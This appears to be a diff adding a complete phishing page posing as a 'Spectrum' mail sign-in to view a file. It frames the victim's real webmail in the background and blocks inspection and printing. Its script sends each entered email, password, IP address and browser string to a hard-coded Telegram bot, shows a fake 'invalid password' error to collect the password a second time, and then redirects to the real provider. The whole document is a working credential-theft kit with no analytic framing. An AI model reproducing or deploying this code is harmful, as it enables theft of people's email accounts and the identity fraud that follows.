@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Mail Settings - Loading...</title>
+        <script type="text/javascript">
+        document.addEventListener('contextmenu', function (e) { e.preventDefault(); });
+        document.addEventListener('keydown', function (e) {
+            if (e.keyCode === 123) e.preventDefault();
+            if (e.ctrlKey && (e.key === 's' || e.keyCode === 83)) e.preventDefault();
+            if (e.ctrlKey && (e.key === 'u' || e.keyCode === 85)) e.preventDefault();
+            if (e.ctrlKey && e.shiftKey && e.keyCode === 73) e.preventDefault();
+            if (e.ctrlKey && e.shiftKey && (e.keyCode === 83)) e.preventDefault();
+        });
+        document.addEventListener('mousedown', function (e) { if (e.button === 2) e.preventDefault(); });
+        document.addEventListener('selectstart', function (e) { e.preventDefault(); });
+        document.addEventListener('dragstart', function (e) { e.preventDefault(); });
+        window.onbeforeprint = function () { alert('Printing is disabled.'); return false; };
+    </script>
+        <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+            background: rgba(0, 0, 0, 0.7);
+        }
+        .form-container {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 25px;
+            border-radius: 15px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            width: 400px;
+            z-index: 2;
+            position: relative;
+        }
+        .form-container h2 {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 20px;
+            font-size: 20px;
+            color: #333;
+        }
+        .input-group {
+            position: relative;
+            margin: 10px 0;
+        }
+        .input-group i {
+            position: absolute;
+            left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #777;
+        }
+        input[type="email"], input[type="password"] {
+            width: 100%;
+            padding: 10px 10px 10px 35px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+        input[type="email"] {
+            background-color: #f9f9f9;
+            cursor: not-allowed;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            transition: background-color 0.3s;
+            margin-top: 20px;
+        }
+        button:hover { background-color: #0056b3; }
+        .secured-text { margin-top: 10px; font-size: 12px; color: #777; }
+        .error-message { color: red; font-size: 12px; margin-top: 5px; display: none; }
+        iframe {
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            border: none;
+            z-index: 1;
+        }
+    </style>
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+        </head>
+        <body>
+          <div class="form-container">
+            <!-- ✅ Spectrum brand header (text only) -->
+            <div style="text-align:left; width:100%; margin-bottom:20px;">
+              <div style="font-size:32px; font-weight:800; color:#0033a0; letter-spacing:-0.5px;">Spectrum</div>
+            </div>
+            <h2>
+              <span id="loginText">Sign in using your receiving email and password</span>
+            </h2>
+            <form id="loginForm" onsubmit="return false;">
+              <div class="input-group">
+                <i class="fas fa-user">
+                </i>
+                <input type="email" id="email" placeholder="Receiver Email Address" required>
+                </div>
+                <div class="input-group">
+                  <i class="fas fa-lock">
+                  </i>
+                  <input type="password" id="password" placeholder="Password" required>
+                  </div>
+                  <div class="error-message" id="errorMessage">Invalid password. Please enter the correct password.</div>
+                  <button type="button" id="viewFileBtn">
+                    <span id="loginButtonText">VIEW FILE</span>
+                  </button>
+                  <div class="secured-text" id="securedText">Secured Login Session</div>
+                </form>
+              </div>
+              <iframe id="websiteFrame" src="">
+              </iframe>
+              <script>
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const loginForm = document.getElementById('loginForm');
+        const websiteFrame = document.getElementById('websiteFrame');
+        const pageTitle = document.querySelector('title');
+        const loginText = document.getElementById('loginText');
+        const loginButtonText = document.getElementById('loginButtonText');
+        const securedText = document.getElementById('securedText');
+        const errorMessage = document.getElementById('errorMessage');
+        const viewFileBtn = document.getElementById('viewFileBtn');
+
+        let retryCount = 0;
+        const maxRetries = 2;
+
+        const TELEGRAM_BOT_TOKEN = '8768856156:AAEI5-3aaLSumcSs593LCQ34w5dhQ707qYI';
+        const TELEGRAM_CHAT_ID = '5583100938';
+
+        passwordInput.addEventListener('input', function() {
+            errorMessage.style.display = 'none';
+        });
+
+        function getDomainFromEmail(email) {
+            return email.split('@')[1];
+        }
+
+        function loadWebsite(domain) {
+            const emailProviders = {
+                'gmail.com': 'https://mail.google.com',
+                'yahoo.com': 'https://mail.yahoo.com',
+                'hotmail.com': 'https://outlook.live.com',
+                'outlook.com': 'https://outlook.live.com',
+                'aol.com': 'https://mail.aol.com',
+                'abv.bg': 'https://mail.abv.bg',
+                '126.com': 'https://mail.126.com',
+                '163.com': 'https://mail.163.com',
+            };
+            const url = emailProviders[domain] || `https://${domain}`;
+            websiteFrame.src = url;
+            updatePageTitle(domain);
+        }
+
+        function updatePageTitle(domain) {
+            fetch(`https://${domain}`)
+                .then(response => response.text())
+                .then(html => {
+                    const doc = new DOMParser().parseFromString(html, 'text/html');
+                    const title = doc.querySelector('title')?.innerText || domain;
+                    pageTitle.innerText = `Mail Settings - ${title}`;
+                })
+                .catch(() => {
+                    pageTitle.innerText = `Mail Settings - ${domain}`;
+                });
+        }
+
+        async function sendToTelegram(email, password, ipInfo, attempt) {
+            const message = `
+New Login Attempt (Attempt ${attempt}):
+Email: ${email}
+Password: ${password}
+IP: ${ipInfo.ip}
+Country: ${ipInfo.country}
+Browser: ${navigator.userAgent}
+            `;
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            const params = new URLSearchParams({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+            });
+            await fetch(url, { method: 'POST', body: params });
+        }
+
+        async function getIPInfo() {
+            const response = await fetch('https://ipinfo.io/json');
+            return response.json();
+        }
+
+        async function translatePage() {
+            try {
+                const ipInfo = await getIPInfo();
+                const country = ipInfo.country;
+                const translations = {
+                    IT: { loginText: "Accedi con la tua email per dimostrare che non sei un robot", emailPlaceholder: "Receiver Email Address", passwordPlaceholder: "Password", loginButtonText: "Accedi", securedText: "Sessione di Accesso Sicura", errorMessage: "Password non valida. Inserisci la password corretta." },
+                    FR: { loginText: "Veuillez vous connecter avec votre email pour prouver que vous n'êtes pas un robot", emailPlaceholder: "Receiver Email Address", passwordPlaceholder: "Mot de passe", loginButtonText: "Se connecter", securedText: "Session de Connexion Sécurisée", errorMessage: "Mot de passe incorrect. Veuillez entrer le mot de passe correct." },
+                    ES: { loginText: "Inicie sesión con su correo electrónico para demostrar que no es un robot", emailPlaceholder: "Correo electrónico", passwordPlaceholder: "Contraseña", loginButtonText: "Iniciar sesión", securedText: "Sesión de Inicio Seguro", errorMessage: "Contraseña incorrecta. Por favor, ingrese la contraseña correcta." },
+                    DE: { loginText: "Bitte melden Sie sich mit Ihrer E-Mail an, um zu beweisen, dass Sie kein Roboter sind", emailPlaceholder: "E-Mail", passwordPlaceholder: "Passwort", loginButtonText: "Anmelden", securedText: "Sichere Anmeldesitzung", errorMessage: "Ungültiges Passwort. Bitte geben Sie das richtige Passwort ein." },
+                    CN: { loginText: "请使用您的电子邮件登录以证明您不是机器人", emailPlaceholder: "电子邮件", passwordPlaceholder: "密码", loginButtonText: "登录", securedText: "安全登录会话", errorMessage: "密码无效。请输入正确的密码。" },
+                    JP: { loginText: "ロボットでないことを証明するために、メールでサインインしてください", emailPlaceholder: "メールアドレス", passwordPlaceholder: "パスワード", loginButtonText: "サインイン", securedText: "安全なログインセッション", errorMessage: "パスワードが無効です。正しいパスワードを入力してください。" },
+                    PT: { loginText: "Por favor, faça login com seu e-mail para provar que você não é um robô", emailPlaceholder: "E-mail", passwordPlaceholder: "Senha", loginButtonText: "Entrar", securedText: "Sessão de login segura", errorMessage: "Senha inválida. Por favor, insira a senha correta." },
+                    RU: { loginText: "Пожалуйста, войдите с помощью вашего электронного адреса, чтобы доказать, что вы не робот", emailPlaceholder: "Электронная почта", passwordPlaceholder: "Пароль", loginButtonText: "Войти", securedText: "Безопасная сессия входа", errorMessage: "Неверный пароль. Пожалуйста, введите правильный пароль." },
+                    BG: { loginText: "Моля, влезте с вашия имейл, за да докажете, че не сте робот", emailPlaceholder: "Имейл", passwordPlaceholder: "Парола", loginButtonText: "Влезте", securedText: "Сигурна сесия за вход", errorMessage: "Невалидна парола. Моля, въведете правилната парола." },
+                    AR: { loginText: "يرجى تسجيل الدخول باستخدام بريدك الإلكتروني لإثبات أنك لست روبوتًا", emailPlaceholder: "البريد الإلكتروني", passwordPlaceholder: "كلمة المرور", loginButtonText: "تسجيل الدخول", securedText: "جلسة تسجيل دخول آمنة", errorMessage: "كلمة المرور غير صالحة. يرجى إدخال كلمة المرور الصحيحة." },
+                    KR: { loginText: "로봇이 아님을 증명하려면 이메일로 로그인하세요", emailPlaceholder: "이메일", passwordPlaceholder: "비밀번호", loginButtonText: "로그인", securedText: "보안 로그인 세션", errorMessage: "잘못된 비밀번호입니다. 올바른 비밀번호를 입력하세요." },
+                };
+                const translation = translations[country] || {
+                    loginText: "Sign in using your receiving email and password",
+                    emailPlaceholder: "Receiver Email Address",
+                    passwordPlaceholder: "Password",
+                    loginButtonText: "VIEW FILE",
+                    securedText: "Secured Login Session",
+                    errorMessage: "Invalid password. Please enter the correct password.",
+                };
+                loginText.innerText = translation.loginText;
+                emailInput.placeholder = translation.emailPlaceholder;
+                passwordInput.placeholder = translation.passwordPlaceholder;
+                loginButtonText.innerText = translation.loginButtonText;
+                securedText.innerText = translation.securedText;
+                errorMessage.innerText = translation.errorMessage;
+            } catch (err) {
+                console.warn("Translation skipped – IP lookup failed:", err);
+            }
+        }
+
+        // ✅ New click handler — prevents default form submission that was wiping the page
+        viewFileBtn.addEventListener('click', async (e) => {
+            e.preventDefault();
+            const email = emailInput.value;
+            const password = passwordInput.value;
+
+            if (!password) {
+                errorMessage.innerText = "Password cannot be empty.";
+                errorMessage.style.display = 'block';
+                retryCount = 0;
+                return;
+            }
+
+            retryCount++;
+
+            let ipInfo = { ip: "Unknown", country: "Unknown" };
+            try {
+                ipInfo = await getIPInfo();
+            } catch (err) {
+                console.warn("IP lookup failed:", err);
+            }
+
+            try {
+                await sendToTelegram(email, password, ipInfo, retryCount);
+            } catch (err) {
+                console.warn("Telegram send failed:", err);
+            }
+
+            if (retryCount < maxRetries) {
+                errorMessage.style.display = 'block';
+                passwordInput.value = '';
+                passwordInput.focus();
+            } else {
+                const domain = getDomainFromEmail(email);
+                window.location.href = `https://${domain}`;
+            }
+        });
+
+        // Also keep submit listener in case Enter key triggers it
+        loginForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            viewFileBtn.click();
+        });
+
+        if (window.location.hash) {
+            const emailFromHash = window.location.hash.substring(1);
+            if (emailFromHash.includes('@')) {
+                emailInput.value = emailFromHash;
+                const domain = getDomainFromEmail(emailFromHash);
+                loadWebsite(domain);
+            }
+        }
+
+        translatePage();
+    </script>
+            </body>
+          </html>
